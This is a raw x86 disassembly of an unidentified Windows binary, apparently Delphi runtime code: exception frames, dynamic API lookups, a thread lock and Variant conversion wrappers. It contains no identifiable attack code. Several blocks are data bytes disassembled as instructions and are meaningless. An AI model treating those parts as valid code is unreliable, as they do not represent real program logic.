lea eax [ ebp - 0x34 ]
push eax
mov ecx r-xdata
mov edx 0x29
mov eax ebx
call sub_40b460
mov edx [ ebp - 0x34 ]
mov eax rw-data
call sub_403ff8
lea eax [ ebp - 0x8 ]
call sub_403fa4
lea eax [ ebp - 0xc ]
call sub_403fa4
lea eax [ ebp - 0x38 ]
push eax
mov ecx r-xdata
mov edx 0x25
mov eax ebx
call sub_40b460
mov eax [ ebp - 0x38 ]
xor edx edx
call sub_408580
test eax eax
jne r-xdata
call sub_40b6e8
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_40403c
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_40403c
jmp r-xdata
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_404324
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_404324
mov cl 0x2c
mov edx 0xc
mov eax ebx
call sub_40b4ac
mov [ rw-data ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d04a
lea eax [ ebp - 0x40 ]
mov edx 0x10
call sub_403fc8
retn
lea eax [ ebp - 0x40 ]
push eax
mov ecx r-xdata
mov edx 0x1005
mov eax ebx
call sub_40b460
mov eax [ ebp - 0x40 ]
xor edx edx
call sub_408580
test eax eax
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov ecx r-xdata
mov edx 0x23
mov eax ebx
call sub_40b460
mov eax [ ebp - 0x3c ]
xor edx edx
call sub_408580
test eax eax
jne r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_40403c
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_40403c
jmp r-xdata
sub_40d0f0
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_40d213
push [ fs : eax ]
mov [ fs : eax ] esp
test [ ebp + 0xc ] 0x2
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_40403c
lea eax [ ebp - 0xc ]
mov edx edi
call sub_40403c
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_4081f8
lea edx [ ebp - 0xc ]
mov eax edi
call sub_4081f8
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx ebx
call sub_40403c
mov eax esi
call sub_403fa4
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_40c94c
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d21a
lea eax [ ebp - 0x14 ]
mov edx 0x4
call sub_403fc8
retn
push [ esi ]
lea eax [ ebp - 0x14 ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0x10 ]
call sub_4044c4
push [ ebp - 0x14 ]
push [ ebp - 0x4 ]
mov eax esi
mov edx 0x3
call sub_404324
lea eax [ ebp - 0x10 ]
push eax
mov eax edi
call sub_404264
mov edx eax
add edx ebx
mov ecx 0x7fffffff
mov eax [ ebp - 0x10 ]
call sub_4044c4
test [ ebp + 0xc ] 0x1
jne r-xdata
mov eax esi
mov edx [ ebp - 0x10 ]
call sub_40426c
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
call sub_404264
mov edx eax
add edx ebx
mov ecx 0x7fffffff
mov eax [ ebp - 0x8 ]
call sub_4044c4
mov eax esi
mov edx [ ebp - 0x10 ]
call sub_40426c
jmp r-xdata
sub_40d22c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_40d2bc
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bce4
mov edx eax
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40b414
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd20
mov edx eax
jmp r-xdata
mov [ edx + 0xc ] ebx
mov eax edx
call sub_4039e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d2c3
lea eax [ ebp - 0x14 ]
call sub_403fa4
retn
sub_40d314
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
pop ebx
retn
mov eax sub_408b40
mov [ rw-data ] eax
sub_40d398
push ebx
push esi
push edi
push ebp
call sub_4035e0
mov ebx edx
mov edi eax
xor esi esi
inc esi
cmp esi 0x10
jne r-xdata
mov eax ebp
mov ebp [ ebp ]
call sub_4027e4
test ebp ebp
jne r-xdata
mov ebp [ edi + esi * 4 + 0x4 ]
xor eax eax
mov [ edi + esi * 4 + 0x4 ] eax
test ebp ebp
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_403244
test bl bl
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4035c8
sub_40d400
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_40d3e8
mov ebx eax
call GetCurrentThreadId
mov esi eax
xor eax eax
mov al bl
mov ebp [ edi + eax * 4 + 0x4 ]
jmp r-xdata
test ebp ebp
je r-xdata
test ebp ebp
jne r-xdata
cmp esi [ ebp + 0x4 ]
jne r-xdata
mov eax [ esp ]
mov [ eax ] ebp
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40d488
mov ebp eax
test ebp ebp
jne r-xdata
mov ebp [ ebp ]
mov eax 0x10
call sub_408034
mov ebp eax
mov [ ebp + 0x4 ] esi
mov [ ebp + 0x8 ] 0x7fffffff
mov [ ebp ] ebp
xor eax eax
mov al bl
lea eax [ edi + eax * 4 + 0x4 ]
mov edx ebp
call sub_40d388
mov [ ebp ] eax
sub_40d488
push ebx
mov ebx eax
mov eax ebx
call sub_40d3e8
and eax 0xff
mov ebx [ ebx + eax * 4 + 0x4 ]
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
lea eax [ ebx + 0x8 ]
mov edx 0x7fffffff
call sub_40d388
cmp eax 0x7fffffff
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
call GetCurrentThreadId
mov [ ebx + 0x4 ] eax
jmp r-xdata
sub_40d4c8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403224
mov [ esi + 0xc ] 0xffff
push 0x0
push 0xffffffff
push 0xffffffff
push 0x0
call CreateEventA
mov [ esi + 0x10 ] eax
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ esi + 0x20 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax esi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_40d53c
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
mov eax esi
call sub_40d5c8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403244
mov eax [ esi + 0x10 ]
push eax
call CloseHandle
mov eax [ esi + 0x14 ]
push eax
call CloseHandle
mov eax [ esi + 0x20 ]
call sub_403254
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_40d5c8
push ebx
push esi
push edi
push ebp
push ecx
mov edi eax
mov bl 0x1
call GetCurrentThreadId
mov esi eax
cmp esi [ edi + 0x24 ]
je r-xdata
inc [ edi + 0x1c ]
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40d584
mov ebp [ edi + 0x28 ]
mov edx esp
mov eax [ edi + 0x20 ]
call sub_40d400
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
seta bl
test bl bl
je r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff0001
call sub_40d390
cmp eax 0xffff
jne r-xdata
lea eax [ edi + 0xc ]
call sub_40d370
jmp r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff
call sub_40d390
test eax eax
je r-xdata
mov eax edi
call sub_40d584
test bl bl
je r-xdata
mov eax edi
call sub_40d5b8
mov [ edi + 0x24 ] esi
lea eax [ edi + 0x28 ]
call sub_40d370
dec eax
cmp eax ebp
sete bl
lea eax [ edi + 0xc ]
call sub_40d37c
sub_40d664
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40d400
dec [ ebx + 0x1c ]
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0xc ]
mov edx 0xffff
call sub_40d390
mov eax ebx
call sub_40d59c
mov eax ebx
call sub_40d590
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40d478
sub_40d6b4
push ebx
push esi
push ecx
mov esi eax
mov edx esp
mov eax [ esi + 0x20 ]
call sub_40d400
mov eax [ esp ]
inc [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x1
seta bl
call GetCurrentThreadId
cmp eax [ esi + 0x24 ]
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax esi
call sub_40d5a8
jmp r-xdata
lea eax [ esi + 0xc ]
call sub_40d37c
test eax eax
jle r-xdata
lea eax [ esi + 0xc ]
call sub_40d370
cmp eax 0xffff
jne r-xdata
push 0x0
call Sleep
mov eax esi
call sub_40d5a8
mov eax esi
call sub_40d59c
sub_40d720
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40d400
mov eax [ esp ]
dec [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40d478
call GetCurrentThreadId
cmp eax [ ebx + 0x24 ]
je r-xdata
lea eax [ ebx + 0xc ]
call sub_40d370
mov ecx eax
cmp ecx 0xffff
jne r-xdata
test ecx ecx
jg r-xdata
mov eax ebx
call sub_40d59c
jmp r-xdata
mov eax ecx
mov ecx 0xffff
cdq
idiv ecx
test edx edx
jne r-xdata
mov eax ebx
call sub_40d59c
sub_40d798
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push edi
push esi
push ebx
mov eax [ ebx ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_40d7bc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40d833
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x4 ]
call sub_405a08
mov ecx eax
mov edx r-xdata
mov eax ebx
call sub_403308
test al al
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d83a
lea eax [ ebp - 0x4 ]
call sub_405a08
retn
mov ecx edi
mov edx esi
mov eax ebx
call sub_403308
test al al
jne r-xdata
mov ecx edi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40d798
test al al
jne r-xdata
mov al 0x1
sub_40d854
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
push edx
call SetErrorMode
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_40d8c6
push [ fs : eax ]
mov [ fs : eax ] esp
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_40d8a8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404464
push eax
call LoadLibraryA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d8af
fnclex
fldcw [ ebp - 0x2 ]
retn
sub_40d8d8
sbb eax 0x4000000
dec eax
add ah al
add eax 0xf2fc0049
dec eax
add [ esp + eax - 0xd0bffb7 ] ch
dec eax
add [ eax - 0x13ffb6fe ] ch
dec eax
add [ esi + eax ] ah
dec ecx
add ah ah
dec eax
add [ esi + eax + 0x49 ] ah
add ah bl
dec eax
add [ eax - 0x2bffb6fd ] dh
dec eax
add [ esp + eax - 0xd33ffb7 ] dl
dec eax
add [ eax + 0x2 ] dl
dec ecx
add ah al
dec eax
add al bh
add al 0x49
add [ edx + esi * 8 + 0x5540048 ] bh
dec ecx
add [ edx + esi * 8 + 0x4600048 ] dh
dec ecx
add [ edx + esi * 8 + 0x46c0048 ] ch
dec ecx
add [ edx + esi * 8 + 0x6e80048 ] ah
dec ecx
add [ edx + esi * 8 + 0x4640048 ] bl
dec ecx
add [ edx + esi * 8 + 0x76c0048 ] dl
dec ecx
add [ edx + esi * 8 + 0x5a00048 ] cl
dec ecx
add [ edx + esi * 8 + 0x5740048 ] al
dec ecx
add [ edx + esi * 8 + 0x48 ] bh
add [ edi + eax - 0xd8bffb7 ] al
dec eax
add [ edi + eax ] ch
dec ecx
add [ edx + esi * 8 + 0x48 ] ch
add [ esp + eax + 0x49 ] bh
add [ edx + esi * 8 + 0x48 ] ah
add al dh
push es
dec ecx
add [ edx + esi * 8 + 0x48 ] bl
add [ eax ] al
pop es
dec ecx
add [ edx + esi * 8 + 0x48 ] dl
add [ eax + 0x4c004903 ] dl
dec eax
add [ ebx + eax ] dh
dec ecx
add [ edx + esi * 8 + 0x48 ] al
add [ eax + 0x5 ] dh
dec ecx
add [ edx + esi * 8 ] bh
dec eax
add [ esi + eax ] bl
dec ecx
add [ edx + esi * 8 ] dh
dec eax
add [ eax + 0x2 ] ah
dec ecx
add [ edx + esi * 8 ] ch
dec eax
add ah ah
push es
dec ecx
add [ edx + esi * 8 ] ah
dec eax
add [ eax + 0x4 ] bh
dec ecx
add [ eax ] ch
add [ eax ] al
add [ edx + esi * 8 ] bl
dec eax
add ah al
push es
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax ] bl
dec eax
add [ edx + eax + 0x49 ] dh
add [ eax ] al
adc al 0xf2
dec eax
add ah bh
add eax 0x49
add [ eax ] al
adc dl dh
dec eax
add [ edx + eax + 0x49 ] ch
add [ eax ] al
add [ eax ] al
add [ edx + esi * 8 ] cl
dec eax
add [ ebx + eax + 0x49 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] cl
dec eax
add [ ebx + eax + 0x49 ] dl
add [ eax ] al
add [ eax ] al
add [ edx + esi * 8 ] al
dec eax
add ah cl
add cl [ ecx ]
add [ eax ] al
add [ eax ] al
add dl dh
dec eax
add [ esp + eax + 0x49 ] dh
add [ eax ] al
add [ eax ] al
add ah bh
int1
dec eax
add [ ebp + eax + 0x49 ] bl
add [ eax ] al
clc
int1
dec eax
add [ eax + 0x3 ] bl
dec ecx
add [ eax ] al
add [ eax ] al
add ah dh
int1
dec eax
add [ eax + 0x5 ] ch
dec ecx
add [ eax ] al
add [ eax ] al
add al dh
int1
dec eax
add [ eax + 0x6 ] ah
dec ecx
add [ eax ] al
add [ eax ] al
add ah ch
int1
dec eax
add [ esi + eax + 0x49 ] cl
add [ eax ] al
add [ eax ] al
add al ch
int1
dec eax
add [ ebp + eax + 0x49 ] dh
add [ eax ] al
in al 0xf1
dec eax
add [ esp + eax + 0x49 ] bl
add [ eax ] al
add [ eax ] al
add al ah
int1
dec eax
add al dh
add ecx [ ecx ]
add [ eax ] al
add [ eax ] al
fdivr st1
dec eax
add [ eax + 0x2 ] ch
dec ecx
add [ eax ] al
add [ eax ] al
add al bl
int1
dec eax
add [ eax + 0x6 ] cl
dec ecx
add [ eax ] al
add [ eax ] al
add ah dl
int1
dec eax
add [ eax + 0x49 ] ch
add [ eax ] al
shl cl 0x1
dec eax
add ah bl
add ecx [ ecx ]
add [ eax ] al
add [ eax ] al
int3
sub_40dd28
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40dd90
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dd97
retn
mov eax sub_40d8d8
call sub_403d50
mov eax r-xdata
call sub_403d78
cmp [ rw-data ] 0x0
je r-xdata
call sub_40c32c
call sub_40c430
call sub_40d314
call sub_40cd78
mov eax rw-data
mov edx r-xdata
call sub_403ff8
sub_40ddd0
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
mov ax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call VariantChangeType
mov eax 0x80004001
jmp r-xdata
pop ebp
retn 0x14
sub_40de24
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40de7e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_40422c
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_408598
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40de85
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
sub_40de90
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40deea
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_40422c
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_409acc
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40def1
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
sub_40defc
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40df56
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_40422c
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_409aa0
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40df5d
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
sub_40df68
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40dfc2
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_40422c
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40b388
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dfc9
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
sub_40dfd4
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40e02e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_40422c
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_409af8
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e035
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
sub_40e040
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_40e0ad
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_40422c
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
call sub_4086a4
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
cmp [ ebp - 0x1 ] 0x1
cmc
sbb eax eax
mov edx [ ebp + 0x14 ]
mov [ edx ] ax
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e0b4
lea eax [ ebp - 0x8 ]
call sub_403fa4
retn
sub_40e0c0
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40e120
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_409a18
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_4047fc
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e127
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
sub_40e130
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40e190
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_40ab14
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_4047fc
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e197
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
sub_40e1a0
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40e204
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
cmp [ ebp + 0x8 ] 0x1
sbb eax eax
inc eax
lea ecx [ ebp - 0x4 ]
xor edx edx
call sub_408740
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x14 ]
call sub_4047fc
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e20b
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
sub_40e254
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx ebx
mov ecx [ ebp + 0x8 ]
cmp [ ecx - 0x4 ] 0x0
je r-xdata
mov eax edx
pop ebx
pop ebp
retn
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
call GetProcAddress
mov edx eax
test edx edx
jne r-xdata
mov edx ebx
sub_40e280
push ebp
mov ebp esp
push ecx
push r-xdata
call GetModuleHandleA
mov [ ebp - 0x4 ] eax
push ebp
mov edx sub_40ddd0
mov eax r-xdata
call sub_40e254
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40de00
mov eax r-xdata
call sub_40e254
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40de00
mov eax r-xdata
call sub_40e254
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40de0c
mov eax r-xdata
call sub_40e254
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40de0c
mov eax r-xdata
call sub_40e254
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40de0c
mov eax r-xdata
call sub_40e254
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40de0c
mov eax r-xdata
call sub_40e254
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40de0c
mov eax r-xdata
call sub_40e254
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40de0c
mov eax r-xdata
call sub_40e254
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40de0c
mov eax r-xdata
call sub_40e254
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40de0c
mov eax r-xdata
call sub_40e254
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40de0c
mov eax r-xdata
call sub_40e254
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40de18
mov eax r-xdata
call sub_40e254
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40de24
mov eax r-xdata
call sub_40e254
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40de90
mov eax r-xdata
call sub_40e254
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40defc
mov eax r-xdata
call sub_40e254
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40df68
mov eax r-xdata
call sub_40e254
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dfd4
mov eax r-xdata
call sub_40e254
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40e040
mov eax r-xdata
call sub_40e254
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40e0c0
mov eax r-xdata
call sub_40e254
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40e130
mov eax r-xdata
call sub_40e254
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40e1a0
mov eax r-xdata
call sub_40e254
pop ecx
mov [ rw-data ] eax
pop ecx
pop ebp
retn
sub_40e58c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40e5b1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e5b8
retn
sub_40e706
inc [ eax ]
add [ eax ] al
add [ eax ] cl
push esi
popad
jb r-xdata
out 0x40 eax
add [ edx ] ah
out 0x40 eax
add [ edi ] ch
out 0x40 eax
add [ edi ] bh
inc eax
popad
outsb
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ edx + 0x5c ] dl
mov dh 0x1c

int3
sub_40e791
mov ebx 0x589e41a6
jg r-xdata
add al 0x8b
add bh bh
and [ ebx - 0xbfbdbbc ] al
jmp sub_41558c
push ss
mov esi 0xe76c2deb
inc eax
add [ eax + eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
sub_40e9ae
add [ eax ] al
or al 0x7c
inc eax
add [ esp + esi + 0x34a80040 ] bl
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
inc esp
xor al [ eax ]
pop ss
inc ebp
push esi
popad
jb r-xdata
push esi
popad
jb r-xdata
popad
outsb
je r-xdata
adc eax 0x72615645
jns r-xdata
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
inc esp
xor al [ eax ]
pop ss
inc ebp
push esi
popad
jb r-xdata
outsb
jbe r-xdata
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] al
add [ eax ] bl
inc ebp
push esi
jb r-xdata
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
outsb
js r-xdata
dec ecx
popad
outsb
je r-xdata
popad
insb
imul esp [ ecx + eax * 2 + 0x72 ] 0x72724567
outsd
jb r-xdata
outsb
je r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0xc0040eb
add [ eax ] al
add [ esp + edi * 2 ] cl
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add bl ch
inc eax
add [ eax + eax ] cl
add [ eax ] al
or al 0x7c
inc eax
add [ esp + esi + 0x34a80040 ] bl
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
inc esp
xor al [ eax ]
sbb [ ebp + 0x56 ] al
outsd
jb r-xdata
imul esp [ ecx + 0x6e ] 0x64614274
dec ecx
lodsb [ esi ]
xor al 0x40
add [ eax - 0x5bffbfcc ] dh
